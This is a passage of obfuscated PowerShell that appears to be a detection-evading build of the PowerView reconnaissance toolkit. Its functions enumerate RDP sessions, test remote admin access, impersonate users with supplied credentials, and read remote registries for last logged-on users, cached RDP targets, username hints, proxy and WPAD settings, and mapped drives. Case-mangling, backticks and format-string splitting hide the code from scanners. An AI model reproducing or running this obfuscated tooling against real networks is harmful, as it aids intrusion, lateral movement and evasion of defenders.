                            ${r`DPS`EsS`iOn} | &("{0}{2}{1}{3}" -f'A','M','dd-','ember') ("{1}{2}{0}"-f'roperty','Note','p') ("{0}{2}{1}" -f'Sourc','P','eI') ${soUr`CEiP}
                            ${R`dP`seSs`ion}."pSobJ`e`CT"."TY`penAM`ES".("{1}{0}" -f 'rt','Inse').Invoke(0, ("{3}{0}{2}{4}{5}{1}" -f 'ower','Info','View','P','.RDPSe','ssion'))
                            ${r`d`P`SeSsion}

                            
                            ${N`ULL} = ${WTSa`pi32}::("{0}{3}{1}{2}" -f'WT','reeMemo','ry','SF').Invoke(${P`pbuf`FeR})

                            ${o`F`FSET} += ${Inc`Rem`E`Nt}
                        }
                    }
                    
                    ${NU`lL} = ${WTSa`pI`32}::("{2}{0}{1}{3}"-f'Free','Memo','WTS','ryEx').Invoke(2, ${pP`Se`Ss`IOninfo}, ${p`cou`NT})
                }
                else {
                    &("{1}{2}{3}{0}"-f'e','W','rite-Verbo','s') "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                }
                
                ${N`ULL} = ${Wtsa`p`i32}::("{1}{0}{4}{2}{3}" -f 'TSCl','W','Se','rver','ose').Invoke(${Han`D`le})
            }
            else {
                &("{1}{3}{0}{4}{2}" -f 'e-V','W','ose','rit','erb') ('[Get'+'-NetRD'+'PSess'+'ion]'+' '+'Er'+'ror '+'open'+'i'+'ng '+'the'+' '+'R'+'emot'+'e '+'D'+'eskto'+'p '+'S'+'es'+'sion '+'Host'+' '+'(RD'+' '+'S'+'es'+'sion '+'Host)'+' '+'server'+' '+'for'+': '+"$ComputerName")
            }
        }
    }

    END {
        if (${lo`gONT`OkEN}) {
            &("{5}{1}{4}{0}{2}{3}" -f 't','e-','ToS','elf','Rever','Invok') -TokenHandle ${L`ogoN`ToK`eN}
        }
    }
}


function te`s`T-ad`MiNA`c`CESS {


    [OutputType({"{4}{3}{1}{0}{2}"-f 'ew.AdminAcce','erVi','ss','w','Po'})]
    [CmdletBinding()]
    Param(
        [Parameter(PoSitIon = 0, VALuEFROmpIpelINe = ${TR`UE}, VaLuefrOMPiPELinebyPRoPeRtYNAMe = ${T`RUE})]
        [Alias({"{0}{1}{2}" -f'Hos','t','Name'}, {"{3}{2}{1}{0}"-f'tname','s','sho','dn'}, {"{1}{0}" -f'me','na'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${C`oMpU`Te`RNa`mE} = ("{0}{1}"-f'localh','ost'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`E`dentIAL} =   ${7T`q02}::"emp`Ty"
    )

    BEGIN {
        if (${P`SBouNDpAR`AMET`ErS}[("{2}{3}{0}{1}" -f'entia','l','C','red')]) {
            ${LOg`OntO`KEn} = &("{1}{4}{5}{7}{3}{2}{0}{6}"-f 't','Invo','a','on','ke-User','Imper','ion','s') -Credential ${cRED`eNTi`Al}
        }
    }

    PROCESS {
        ForEach (${c`O`MpuTer} in ${CoM`pUTe`RN`AME}) {
            
            
            ${H`ANDlE} = ${ADVaP`i`32}::("{0}{4}{1}{3}{2}" -f 'OpenSCM','ag','rW','e','an').Invoke("\\$Computer", ("{0}{2}{1}"-f 'Servic','ctive','esA'), 0xF003F);${L`A`STer`ROR} =  (  gI  ("Var"+"I"+"ablE"+":"+"vpzs"))."V`ALUe"::("{0}{2}{1}{3}{5}{4}"-f'G','La','et','stWin32','or','Err').Invoke()

            ${i`sAdmIN} = &("{0}{2}{1}"-f'New','ect','-Obj') ("{0}{2}{1}"-f'PS','ect','Obj')
            ${iSaD`min} | &("{0}{2}{3}{1}" -f'Ad','Member','d','-') ("{0}{2}{1}" -f 'Noteprop','ty','er') ("{0}{2}{1}"-f 'Compu','ame','terN') ${c`OMPutEr}

            
            if (${Ha`NDle} -ne 0) {
                ${nU`Ll} = ${A`dVa`pI32}::("{1}{3}{2}{0}{4}"-f'ndl','Clo','ServiceHa','se','e').Invoke(${h`ANd`LE})
                ${iS`Ad`miN} | &("{0}{1}{2}"-f'Ad','d-Me','mber') ("{3}{1}{0}{2}"-f 'rope','otep','rty','N') ("{0}{1}{2}" -f'Is','Adm','in') ${t`RUe}
            }
            else {
                &("{1}{0}{2}"-f 'ite-Ver','Wr','bose') "[Test-AdminAccess] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                ${Is`A`dmIN} | &("{0}{2}{1}" -f 'Add','er','-Memb') ("{0}{1}{3}{2}" -f 'Not','ep','operty','r') ("{1}{0}" -f'Admin','Is') ${f`A`lSe}
            }
            ${I`s`ADMIN}."ps`o`BjecT"."TyP`ENa`mes".("{0}{1}" -f'I','nsert').Invoke(0, ("{2}{0}{4}{1}{6}{3}{5}" -f'er','min','Pow','s','View.Ad','s','Acce'))
            ${IsADm`IN}
        }
    }

    END {
        if (${LOGo`NT`OKen}) {
            &("{4}{5}{3}{0}{2}{6}{1}" -f 'Rev','lf','e','-','I','nvoke','rtToSe') -TokenHandle ${LOGo`NT`O`keN}
        }
    }
}


function GeT`-NetCOmP`U`TERSiTeN`A`ME {


    [OutputType({"{3}{4}{0}{2}{1}" -f'iew.Co','erSite','mput','Po','werV'})]
    [CmdletBinding()]
    Param(
        [Parameter(PosItIoN = 0, VaLUefrOmPIPELinE = ${T`RUe}, VAlUEfROmpIpELInebYPROPErTyname = ${t`RUe})]
        [Alias({"{0}{1}{2}" -f 'H','ostNam','e'}, {"{1}{2}{3}{0}"-f'ame','d','nshost','n'}, {"{0}{1}"-f 'na','me'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${cOMP`UTE`RnaME} = ("{0}{2}{1}" -f 'l','ost','ocalh'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`ede`NTIAl} =   ${7`TQ02}::"Em`PtY"
    )

    BEGIN {
        if (${p`SBoU`ND`PARAMEte`RS}[("{0}{2}{1}"-f'Cre','ial','dent')]) {
            ${l`o`gOn`ToKEN} = &("{4}{5}{6}{2}{3}{1}{0}"-f'n','natio','per','so','Invok','e-Us','erIm') -Credential ${CRE`DeNT`i`Al}
        }
    }

    PROCESS {
        ForEach (${c`OmPU`TEr} in ${Co`MpU`Ter`N`Ame}) {
            
            if (${co`Mp`UT`Er} -match '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$') {
                ${iP`AdDr`ESS} = ${C`omP`UTeR}
                ${coM`PUteR} =   ${6`lU`5g4}::("{0}{2}{1}{3}" -f'GetHo','dd','stByA','ress').Invoke(${CoMPu`T`er}) | &("{2}{0}{1}"-f 'elect-Obje','ct','S') -ExpandProperty ("{1}{0}"-f 'me','HostNa')
            }
            else {
                ${I`paDDR`ESs} = @(&("{1}{3}{0}{4}{2}"-f'-','R','s','esolve','IPAddres') -ComputerName ${c`oMPut`ER})[0]."ip`ADDR`eSS"
            }

            ${P`TrInfo} =   ${zf`V`W1}::"ZE`Ro"

            ${R`ES`Ult} = ${NetAP`I`32}::"d`SGEtSiT`ena`ME"(${cOMp`UT`er}, [ref]${Ptr`IN`Fo})

            ${cOMp`UTeR`s`ItE} = &("{2}{0}{1}"-f 'Obj','ect','New-') ("{1}{2}{0}"-f 'ect','PS','Obj')
            ${COMPUteRS`I`TE} | &("{0}{1}{2}"-f'Add-Mem','be','r') ("{3}{0}{2}{1}"-f'otepr','y','opert','N') ("{1}{0}{3}{2}" -f 'te','Compu','e','rNam') ${Co`M`PUt`ER}
            ${cO`MPU`TeR`SiTE} | &("{2}{0}{1}{3}" -f'd','d-Me','A','mber') ("{2}{3}{0}{1}"-f'ro','perty','No','tep') ("{2}{1}{0}" -f 'ss','re','IPAdd') ${IP`ADDRE`ss}

            if (${rE`Su`LT} -eq 0) {
                ${sI`Te`NAME} =  (VarIablE  ("{0}{1}"-f 'J','76')  )."VA`Lue"::("{1}{0}{3}{2}" -f'rToS','Pt','uto','tringA').Invoke(${Ptr`iN`Fo})
                ${c`om`PU`TeRsIte} | &("{2}{1}{3}{0}" -f'er','d','A','d-Memb') ("{2}{1}{0}"-f 'teproperty','o','N') ("{2}{0}{1}"-f'am','e','SiteN') ${siTE`N`AME}
            }
            else {
                &("{2}{1}{0}"-f'se','o','Write-Verb') "[Get-NetComputerSiteName] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
                ${cO`MpU`TErS`i`TE} | &("{0}{1}{2}" -f'A','dd-M','ember') ("{1}{2}{0}" -f 'erty','Note','prop') ("{1}{2}{0}" -f 'me','Sit','eNa') ''
            }
            ${Com`pUTE`RS`iTe}."PS`O`BJeCt"."tYpeNA`meS".("{1}{0}" -f'nsert','I').Invoke(0, ("{0}{4}{3}{1}{6}{2}{5}" -f'Powe','C','mpute','View.','r','rSite','o'))

            
            ${n`UlL} = ${NE`Tapi`32}::("{0}{4}{5}{3}{2}{1}" -f 'Ne','e','ufferFre','iB','t','Ap').Invoke(${pTr`iN`Fo})

            ${C`OMput`er`sItE}
        }
    }

    END {
        if (${l`OGonTOK`EN}) {
            &("{4}{3}{0}{2}{1}{5}" -f 'o','e-RevertToSel','k','nv','I','f') -TokenHandle ${LOg`On`ToK`En}
        }
    }
}


function GET-`WmIREG`prOXy {


    [OutputType({"{1}{2}{0}{4}{3}"-f 't','Po','werView.ProxySe','ings','t'})]
    [CmdletBinding()]
    Param(
        [Parameter(PosiTiOn = 0, vALUeFROmpipELinE = ${tR`UE}, VAluefROMPIpELiNebyPrOpertYNAME = ${t`RuE})]
        [Alias({"{1}{2}{0}"-f 'Name','Ho','st'}, {"{0}{1}{2}" -f 'd','nshostna','me'}, {"{1}{0}"-f'e','nam'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Co`mPuter`NAmE} = ${E`N`V`:ComPutErnaME},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`eD`eNtIal} =   (  VarIABle ("7t"+"q02")  -VALu )::"Em`PTY"
    )

    PROCESS {
        ForEach (${co`MP`UteR} in ${C`O`mPUtErN`Ame}) {
            try {
                ${wmIAR`Gum`eNTs} = @{
                    ("{0}{1}"-f'Lis','t') = ${tr`UE}
                    ("{0}{1}" -f 'Cla','ss') = ("{1}{0}{2}"-f'RegP','Std','rov')
                    ("{2}{0}{1}" -f's','pace','Name') = ((("{2}{3}{1}{0}" -f 'ault','ef','root{0','}d'))  -f [chAR]92)
                    ("{0}{2}{1}" -f 'C','ername','omput') = ${co`MP`UTER}
                    ("{0}{1}{2}"-f'ErrorAc','ti','on') = ("{1}{0}" -f'op','St')
                }
                if (${P`sBOunD`PARa`M`eTERs}[("{2}{0}{1}" -f 'denti','al','Cre')]) { ${W`miA`R`Gume`Nts}[("{2}{0}{1}" -f'reden','tial','C')] = ${c`Re`denTI`AL} }

                ${R`eGP`RO`VIdEr} = &("{3}{1}{2}{0}" -f 'ect','iOb','j','Get-Wm') @WmiArguments
                ${K`ey} = ((("{4}{15}{14}{16}{3}{10}{1}{12}{9}{6}{8}{11}{7}{13}{0}{2}{5}"-f'rnet S','aWi','ett','oftd','SO','ings','sdPaCu','on','rrentVe','ow','P','rsi','nd','dPaInte','PaMic','FTWAREd','ros')) -rEplAce 'dPa',[cHar]92)

                
                ${H`kcU} = 2147483649
                ${PrO`XYs`eR`Ver} = ${RE`GProvI`DeR}.("{2}{3}{1}{0}"-f 'e','alu','Get','StringV').Invoke(${Hk`CU}, ${K`eY}, ("{1}{0}{2}" -f'xyServe','Pro','r'))."SVA`l`UE"
                ${a`U`To`coNFig`Url} = ${REGp`RO`VId`Er}.("{2}{0}{1}"-f 'etString','Value','G').Invoke(${hk`cU}, ${K`EY}, ("{1}{2}{0}"-f 'L','Au','toConfigUR'))."sv`ALUE"

                ${wP`Ad} = ''
                if (${a`UtoC`o`N`FiGURL} -and (${AutO`CoN`F`I`guRl} -ne '')) {
                    try {
                        ${w`PaD} = (&("{0}{1}{2}" -f'N','ew-Objec','t') ("{0}{2}{3}{1}{4}"-f'Net','ebCli','.','W','ent')).("{2}{3}{4}{1}{0}"-f'ng','adStri','D','own','lo').Invoke(${aUtOConfI`g`UrL})
                    }
                    catch {
                        &("{1}{2}{3}{0}" -f 'ng','Wri','te-','Warni') ('[Get'+'-WMIRegP'+'rox'+'y'+'] '+'E'+'rro'+'r '+'connectin'+'g'+' '+'to'+' '+'Auto'+'ConfigU'+'RL '+': '+"$AutoConfigURL")
                    }
                }

                if (${PrO`XYs`Erver} -or ${A`U`TOCoNf`igurl}) {
                    ${O`UT} = &("{0}{1}{3}{2}" -f'New-O','b','ect','j') ("{0}{1}"-f'PS','Object')
                    ${o`UT} | &("{1}{0}{2}{3}"-f 'em','Add-M','b','er') ("{2}{0}{1}"-f'tepro','perty','No') ("{1}{0}{2}{3}"-f'p','Com','uterNam','e') ${cO`M`putEr}
                    ${o`UT} | &("{2}{0}{1}" -f 'Membe','r','Add-') ("{1}{0}{2}" -f 'oteprope','N','rty') ("{0}{3}{2}{1}" -f 'P','r','yServe','rox') ${pR`OXYsE`RvER}
                    ${o`Ut} | &("{0}{2}{1}"-f 'Add','r','-Membe') ("{1}{2}{3}{0}"-f 'operty','No','t','epr') ("{0}{1}{3}{2}"-f'AutoC','on','RL','figU') ${Au`TO`cOnFIgurL}
                    ${O`UT} | &("{0}{2}{1}" -f 'Add-Me','ber','m') ("{1}{0}{2}{3}" -f'r','Noteprope','t','y') ("{0}{1}"-f 'Wp','ad') ${W`PAD}
                    ${O`Ut}."p`SOB`JecT"."Typ`E`NAmes".("{1}{0}" -f'ert','Ins').Invoke(0, ("{1}{5}{4}{0}{3}{2}"-f 'tt','P','gs','in','View.ProxySe','ower'))
                    ${O`Ut}
                }
                else {
                    &("{0}{1}{2}"-f 'Writ','e-Wa','rning') ('[G'+'e'+'t-'+'WMIRegPro'+'xy'+'] '+'N'+'o '+'pro'+'xy '+'sett'+'i'+'ngs '+'foun'+'d '+'f'+'or '+"$ComputerName")
                }
            }
            catch {
                &("{2}{1}{0}" -f'g','-Warnin','Write') ('[Get-'+'WMIRegPr'+'oxy]'+' '+'Err'+'o'+'r '+'e'+'numer'+'ati'+'ng '+'pro'+'x'+'y '+'s'+'ettings'+' '+'fo'+'r '+"$ComputerName "+': '+"$_")
            }
        }
    }
}


function GEt`-wmIRe`gLAs`TloG`gE`don {


    [OutputType({"{5}{1}{4}{0}{6}{2}{3}"-f 'a','iew','OnUse','r','.L','PowerV','stLogged'})]
    [CmdletBinding()]
    Param(
        [Parameter(PoSiTIOn = 0, vAluEFroMPipELine = ${TR`Ue}, VAlueFRoMPipElIneBYproPerTYnaME = ${T`Rue})]
        [Alias({"{1}{0}{2}" -f 'm','HostNa','e'}, {"{1}{2}{0}" -f'e','dnsho','stnam'}, {"{1}{0}" -f'ame','n'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${C`omp`UTeRNAMe} = ("{2}{0}{1}" -f 'oc','alhost','l'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CrEdE`N`Tial} =   ( vArIable ("{1}{0}" -f '2','7Tq0'))."VAL`Ue"::"eM`Pty"
    )

    PROCESS {
        ForEach (${C`OMpU`TEr} in ${COm`p`U`TerNaMe}) {
            
            ${h`Klm} = 2147483650

            ${wmIArGU`m`eNTs} = @{
                ("{0}{1}" -f'Li','st') = ${Tr`Ue}
                ("{1}{0}"-f 's','Clas') = ("{0}{2}{1}" -f'StdRegP','v','ro')
                ("{2}{0}{1}"-f 'esp','ace','Nam') = ((("{0}{3}{1}{2}" -f 'rootTCL','a','ult','def')) -cRePlACE ([cHAR]84+[cHAR]67+[cHAR]76),[cHAR]92)
                ("{2}{0}{1}" -f 'ute','rname','Comp') = ${com`PUT`eR}
                ("{1}{0}{3}{2}"-f'rrorAc','E','ion','t') = ("{2}{3}{1}{0}" -f 'ontinue','tlyC','S','ilen')
            }
            if (${pSBOUND`PA`RA`Me`TERS}[("{1}{0}{2}"-f'denti','Cre','al')]) { ${wMI`Ar`gu`MENTS}[("{2}{1}{0}" -f 'ial','nt','Crede')] = ${Cr`eDEN`T`IAL} }

            
            try {
                ${R`eg} = &("{0}{3}{2}{1}" -f 'Ge','bject','WmiO','t-') @WmiArguments

                ${k`Ey} = ((("{13}{3}{11}{12}{4}{7}{8}{0}{9}{10}{5}{6}{2}{1}"-f 'zBTCurrentVers','nUI','onzBTLogo','WAR','roso','n','ticati','ftzB','TWindows','ionzB','TAuthe','EzBTM','ic','SOFT'))-crePLaCE 'zBT',[ChAR]92)
                ${VA`LUE} = ("{2}{1}{3}{0}" -f'er','U','LastLoggedOn','s')
                ${la`sTUS`eR} = ${r`EG}.("{1}{0}{2}{3}" -f'tS','Ge','trin','gValue').Invoke(${hk`lm}, ${k`ey}, ${Va`L`Ue})."s`V`AluE"

                ${LA`stLOgGe`dOn} = &("{3}{2}{0}{1}"-f'b','ject','ew-O','N') ("{0}{2}{1}"-f 'P','bject','SO')
                ${LAStL`O`GGEDOn} | &("{0}{2}{1}" -f 'Ad','mber','d-Me') ("{3}{2}{1}{0}" -f'erty','prop','e','Not') ("{1}{0}{2}{3}"-f 'o','C','mputerN','ame') ${c`Om`PUTer}
                ${lAS`Tlo`GgeDoN} | &("{1}{0}{2}" -f 'dd-M','A','ember') ("{0}{3}{2}{1}"-f'Not','y','pert','epro') ("{2}{0}{1}"-f 'gged','On','LastLo') ${l`As`TuSer}
                ${la`sT`LOgge`don}."pS`ObJ`ECt"."TyP`E`NaMes".("{0}{1}" -f'Ins','ert').Invoke(0, ("{1}{0}{7}{3}{2}{4}{5}{6}" -f 'e','Pow','ged','ew.LastLog','On','Use','r','rVi'))
                ${Las`TloGge`d`oN}
            }
            catch {
                &("{0}{2}{1}{3}"-f 'Writ','n','e-Warni','g') ('['+'Get-WM'+'IRegLast'+'Logged'+'On]'+' '+'Erro'+'r '+'op'+'e'+'ning '+'remote'+' '+'regist'+'r'+'y'+' '+'on'+' '+"$Computer. "+'Remo'+'te'+' '+'regis'+'t'+'ry'+' '+'lik'+'ely '+'n'+'ot '+'e'+'n'+'abled.')
            }
        }
    }
}


function GET-`WMi`R`Egca`chedR`DP`cO`NNE`ctIOn {


    [OutputType({"{6}{4}{7}{8}{3}{1}{2}{0}{5}"-f'ect','C','onn','dRDP','w','ion','Po','e','rView.Cache'})]
    [CmdletBinding()]
    Param(
        [Parameter(POsITIOn = 0, VALuEFrOMpIPeLiNe = ${tR`UE}, vALueFRoMpipElinEBYprOPErTyNaMe = ${T`RUE})]
        [Alias({"{1}{0}{2}"-f'Nam','Host','e'}, {"{3}{1}{0}{2}" -f'tn','shos','ame','dn'}, {"{0}{1}" -f 'n','ame'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${co`mpUt`eRnamE} = ("{0}{1}" -f'local','host'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`Rede`NTiAl} =   (  gEt-VARIABLe ('7t'+'Q02') )."vaL`Ue"::"eMP`Ty"
    )

    PROCESS {
        ForEach (${c`o`mPutEr} in ${ComPUT`e`R`Na`ME}) {
            
            ${h`KU} = 2147483651

            ${wMiA`RGumen`Ts} = @{
                ("{1}{0}"-f 'st','Li') = ${T`RUe}
                ("{0}{1}"-f'C','lass') = ("{0}{2}{1}" -f 'StdRe','Prov','g')
                ("{0}{1}"-f 'Names','pace') = ((("{1}{3}{0}{2}" -f '0}d','ro','efault','ot{')) -f [CHaR]92)
                ("{0}{2}{1}{3}" -f'Com','terna','pu','me') = ${c`OmPU`TeR}
                ("{1}{2}{0}" -f'on','Er','rorActi') = ("{1}{0}"-f 'top','S')
            }
            if (${p`s`BouNDpar`A`mE`TERS}[("{3}{1}{2}{0}" -f'l','ede','ntia','Cr')]) { ${wM`IaRGUme`N`TS}[("{3}{1}{0}{2}" -f 'entia','red','l','C')] = ${cR`EDe`NT`iAL} }

            try {
                ${r`Eg} = &("{1}{2}{0}"-f 't','Get-WmiObj','ec') @WmiArguments

                
                ${USER`Si`Ds} = (${r`Eg}.("{1}{2}{0}" -f 'Key','Enu','m').Invoke(${H`KU}, ''))."sN`AMEs" | &("{0}{1}{2}"-f 'W','he','re-Object') { ${_} -match ((('S-1-5'+'-'+'21-[0-9'+']+-[0'+'-9]+-['+'0-9]+'+'-[0'+'-9'+']+stP')  -REplACe 'stP',[chaR]36)) }

                ForEach (${u`serSid} in ${user`Sids}) {
                    try {
                        if (${PSBo`UNDpar`Am`EteRS}[("{2}{0}{1}"-f 'redenti','al','C')]) {
                            ${u`seRnaMe} = &("{2}{1}{3}{0}{4}" -f'm','nvert','Co','Fro','-SID') -ObjectSid ${usERS`Id} -Credential ${CrE`DENti`AL}
                        }
                        else {
                            ${usErn`A`me} = &("{0}{2}{1}{4}{3}" -f 'Co','F','nvert','om-SID','r') -ObjectSid ${U`SersID}
                        }

                        
                        ${C`On`NeCT`IonK`Eys} = ${r`EG}.("{0}{1}{2}"-f'E','n','umValues').Invoke(${H`Ku},("$UserSID\Software\Microsoft\Terminal "+'Serve'+'r'+' '+(('C'+'lientA'+'pKDefau'+'lt') -CrePlaCE  'ApK',[ChAr]92)))."snA`MES"

                        ForEach (${C`oNnecT`Ion} in ${Conne`c`TiOn`K`EyS}) {
                            
                            if (${coN`Nect`ion} -match ("{0}{1}"-f 'MRU','.*')) {
                                ${t`AR`G`etsE`RvEr} = ${R`eG}.("{1}{2}{3}{0}" -f'e','GetS','trin','gValu').Invoke(${H`Ku}, ("$UserSID\Software\Microsoft\Terminal "+'Se'+'rver'+' '+(('Clien'+'t1cn'+'Defa'+'ul'+'t') -CrEpLacE '1cn',[ChaR]92)), ${CoN`NE`ctI`on})."Sva`luE"

                                ${f`Ound`ConNe`C`TION} = &("{2}{1}{0}"-f 'ct','bje','New-O') ("{0}{1}{2}"-f'P','SO','bject')
                                ${f`OUnDC`ONn`EcTiON} | &("{2}{0}{1}" -f'-M','ember','Add') ("{1}{2}{0}{3}" -f'teprope','N','o','rty') ("{0}{3}{1}{2}"-f 'Co','uterNa','me','mp') ${COmPu`TeR}
                                ${fOu`Nd`cONNecTi`oN} | &("{2}{0}{1}"-f'dd-M','ember','A') ("{1}{0}{2}"-f 'o','N','teproperty') ("{0}{1}{2}" -f'U','s','erName') ${User`Na`mE}
                                ${FoU`NDco`N`Ne`ctIoN} | &("{2}{1}{0}"-f 'er','Memb','Add-') ("{0}{1}{2}" -f'No','teprope','rty') ("{0}{1}" -f 'Use','rSID') ${U`seR`sId}
                                ${FOun`dConnE`Ct`ion} | &("{2}{1}{0}"-f'r','d-Membe','Ad') ("{3}{2}{1}{0}" -f 'erty','prop','te','No') ("{0}{3}{1}{2}"-f 'Targ','tServ','er','e') ${T`A`R`GeTS`eRvER}
                                ${fOUND`CONN`ect`Ion} | &("{0}{2}{1}"-f 'Add','r','-Membe') ("{1}{0}{2}"-f 'oteprop','N','erty') ("{0}{1}{2}{3}" -f'Use','r','nam','eHint') ${NU`LL}
                                ${FoUNdC`oN`Ne`CTioN}."PsO`BJE`cT"."t`yPENaMeS".("{1}{0}" -f't','Inser').Invoke(0, ("{4}{7}{1}{0}{5}{8}{6}{2}{3}" -f 'rVi','e','on','nection','P','ew.Cach','PC','ow','edRD'))
                                ${Fo`U`Ndc`oNnecTIon}
                            }
                        }

                        
                        ${S`eRv`ErKEys} = ${R`Eg}.("{0}{1}{2}" -f'En','um','Key').Invoke(${H`Ku},("$UserSID\Software\Microsoft\Terminal "+'Serv'+'e'+'r '+('ClientNh'+'3S'+'erv'+'ers')."RE`PLa`CE"(([CHAr]78+[CHAr]104+[CHAr]51),[sTriNG][CHAr]92)))."SNa`M`ES"

                        ForEach (${seR`VER} in ${s`e`R`VErkEys}) {

                            ${usER`NAM`E`Hi`NT} = ${R`EG}.("{0}{3}{2}{1}" -f 'Ge','gValue','Strin','t').Invoke(${H`ku}, ("$UserSID\Software\Microsoft\Terminal "+'Ser'+'ver'+' '+"Client\Servers\$Server"), ("{1}{0}{2}" -f'sernam','U','eHint'))."Sv`A`LuE"

                            ${FOu`NDcOnn`E`cTioN} = &("{2}{1}{0}" -f 'ect','Obj','New-') ("{1}{2}{0}"-f 'bject','PS','O')
                            ${F`ouN`DCON`NE`cTiON} | &("{0}{2}{1}"-f'Add-','ember','M') ("{0}{2}{1}{3}" -f'Notep','ope','r','rty') ("{2}{0}{3}{1}" -f 'N','e','Computer','am') ${ComP`U`TeR}
                            ${Fo`U`NDcOnnEC`TIoN} | &("{1}{2}{0}" -f'Member','A','dd-') ("{0}{2}{1}{3}"-f 'N','oper','otepr','ty') ("{0}{1}"-f 'UserNam','e') ${USE`RN`AME}
                            ${FoUNdcon`NeC`T`ion} | &("{0}{2}{1}"-f'A','mber','dd-Me') ("{3}{1}{2}{0}"-f'ty','ep','roper','Not') ("{2}{0}{1}" -f'er','SID','Us') ${user`S`ID}
                            ${FOUndCon`N`E`cTi`on} | &("{1}{0}{2}" -f 'b','Add-Mem','er') ("{1}{2}{3}{0}"-f 'erty','No','tepr','op') ("{2}{3}{1}{0}"-f 'r','rve','TargetS','e') ${s`eRveR}
                            ${f`oun`DcONNECTioN} | &("{0}{1}{3}{2}"-f'Ad','d-','ember','M') ("{2}{3}{0}{1}"-f'rop','erty','Note','p') ("{1}{2}{0}"-f 'int','U','sernameH') ${UsEr`NAMeH`i`Nt}
                            ${F`ouNdCON`NECT`IoN}."PS`OBJecT"."typE`NA`Mes".("{0}{1}{2}"-f 'I','n','sert').Invoke(0, ("{0}{3}{1}{2}{4}{5}"-f'Po','w.C','ac','werVie','hedRDPConne','ction'))
                            ${FO`U`NdcO`NNectiON}
                        }
                    }
                    catch {
                        &("{3}{2}{1}{0}" -f'-Verbose','e','rit','W') ('[Get'+'-'+'WMI'+'RegCached'+'RDP'+'C'+'on'+'n'+'ection] '+'Error'+': '+"$_")
                    }
                }
            }
            catch {
                &("{0}{4}{2}{3}{1}" -f'Write','g','r','nin','-Wa') ('[Get-WMIRe'+'gCac'+'h'+'e'+'dRDPCo'+'nne'+'cti'+'on]'+' '+'E'+'rror '+'acc'+'ess'+'ing '+"$Computer, "+'li'+'k'+'ely '+'insuffi'+'cient'+' '+'per'+'m'+'issions '+'or'+' '+'firew'+'a'+'ll '+'r'+'ules'+' '+'on'+' '+'h'+'ost'+': '+"$_")
            }
        }
    }
}


function G`eT-w`miR`e`GmO`UNT`EDDrIVE {


    [OutputType({"{3}{5}{4}{1}{7}{6}{0}{2}"-f'dDr','egMou','ive','Power','w.R','Vie','te','n'})]
    [CmdletBinding()]
    Param(
        [Parameter(PositIOn = 0, ValuEFrOMPipELiNE = ${t`RUe}, vAlUEfRoMPIpElIneBypROPeRtynaMe = ${tr`UE})]
        [Alias({"{1}{0}"-f'Name','Host'}, {"{1}{2}{0}{3}"-f'hostnam','dn','s','e'}, {"{0}{1}" -f'nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${CO`mP`UTe`RnAmE} = ("{1}{0}{2}" -f'ho','local','st'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRedENt`I`AL} =   (Get-VARiABLE ('7'+'Tq02')  )."v`ALue"::"em`pty"
    )

    PROCESS {
        ForEach (${cOmpUt`eR} in ${cOmP`U`TernaMe}) {
            
            ${H`KU} = 2147483651

            ${wmIA`R`GuMEn`Ts} = @{
                ("{0}{1}" -f'Lis','t') = ${tr`UE}
                ("{1}{0}"-f 'lass','C') = ("{0}{2}{1}"-f 'St','Prov','dReg')
                ("{2}{0}{1}" -f'pac','e','Names') = ((("{2}{0}{3}{1}{4}" -f 'o','gdef','r','otQa','ault'))."R`EplAce"(([chAr]81+[chAr]97+[chAr]103),[sTRINg][chAr]92))
                ("{2}{0}{1}"-f 'm','e','Computerna') = ${CO`M`PuTer}
                ("{1}{0}{3}{2}"-f'ro','Er','tion','rAc') = ("{0}{1}"-f 'St','op')
            }
            if (${p`sBounD`P`ArA`meTers}[("{1}{0}{2}" -f 'e','Cred','ntial')]) { ${WmIA`R`Gu`MEntS}[("{1}{0}{2}"-f 'i','Credent','al')] = ${c`ReDEnTi`AL} }

            try {
                ${R`EG} = &("{1}{2}{4}{3}{0}"-f 'ect','Ge','t-Wm','Obj','i') @WmiArguments

                
                ${uSERS`IDs} = (${r`Eg}.("{0}{2}{1}"-f'Enu','ey','mK').Invoke(${H`ku}, ''))."SnaM`ES" | &("{0}{2}{1}"-f'Where','bject','-O') { ${_} -match (('S-1-5-21-[0-9]'+'+-['+'0'+'-9'+']+-[0-9]'+'+-[0'+'-'+'9'+']+{0}') -F [ChAR]36) }

                ForEach (${U`sER`SID} in ${u`sErsiDs}) {
                    try {
                        if (${P`sBo`UNd`paR`AMEtERs}[("{0}{2}{1}" -f 'Cr','ential','ed')]) {
                            ${Us`ER`NAMe} = &("{2}{0}{1}{3}" -f'vertFrom-S','I','Con','D') -ObjectSid ${Us`ErS`iD} -Credential ${c`RedE`NtIaL}
                        }
                        else {
                            ${US`Ername} = &("{2}{3}{0}{1}" -f'rt','From-SID','Co','nve') -ObjectSid ${usEr`sid}
                        }

                        ${DRIVE`lEt`Ters} = (${r`EG}.("{1}{0}" -f 'ey','EnumK').Invoke(${H`kU}, "$UserSID\Network"))."SNA`mES"

                        ForEach (${D`RIveLe`TT`er} in ${DRi`VEl`e`TTe`RS}) {
                            ${prOV`i`d`erName} = ${r`Eg}.("{1}{0}{2}{3}"-f 'e','G','t','StringValue').Invoke(${H`ku}, "$UserSID\Network\$DriveLetter", ("{0}{1}{3}{2}"-f 'Pr','o','rName','vide'))."S`VALuE"
